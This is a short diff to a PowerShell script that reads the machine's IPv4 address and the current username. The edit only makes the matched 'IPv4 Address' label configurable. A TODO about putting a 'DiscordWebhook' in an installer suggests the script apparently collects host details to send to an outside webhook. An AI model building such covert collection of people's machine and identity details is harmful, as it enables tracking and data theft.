@@ -2,7 +2,10 @@
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
 # Get IPv4 address of the machine
-$IPAddress = ipconfig | Select-String -Pattern "IPv4 Address" | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
+$IPAddressString = "IPv4 Address"
+# Uncomment the following line when using older versions of Windows without IPv6 support
+# $IPAddressString = "IP Address"
+$IPAddress = ipconfig | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
 
 # Get the current user's username
 $Username = $env:USERNAME
